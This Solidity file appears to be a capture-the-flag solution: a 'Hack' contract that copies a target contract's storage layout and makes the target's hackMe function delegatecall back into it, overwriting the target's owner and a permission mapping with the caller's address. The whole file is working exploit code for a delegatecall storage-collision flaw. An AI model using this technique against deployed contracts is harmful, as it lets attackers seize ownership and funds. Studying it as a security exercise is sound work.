// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./D31eg4t3.sol";

contract Hack {
    uint256 a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe;

    function changeOwner(address addr) external {
        owner = addr;
    }

    function changecanYouHackMe(address addr) external {
        canYouHackMe[addr] = true;
    }

    function attack(D31eg4t3 addr) public payable {
        D31eg4t3 delegate;
        delegate = D31eg4t3(addr);

        //This will send force D31eg4t3 contract to call changeOwner of this contract and in this process it will change its owner
        bytes memory val = abi.encodeWithSignature(
            "changeOwner(address)",
            msg.sender
        );
        delegate.hackMe(val);

        //This will send force D31eg4t3 contract to call changecanYouHackMe of this contract and in this process it will change its boolean value of the canYouHackMe(msg.sender)
        val = abi.encodeWithSignature(
            "changecanYouHackMe(address)",
            msg.sender
        );
        delegate.hackMe(val);
    }
}
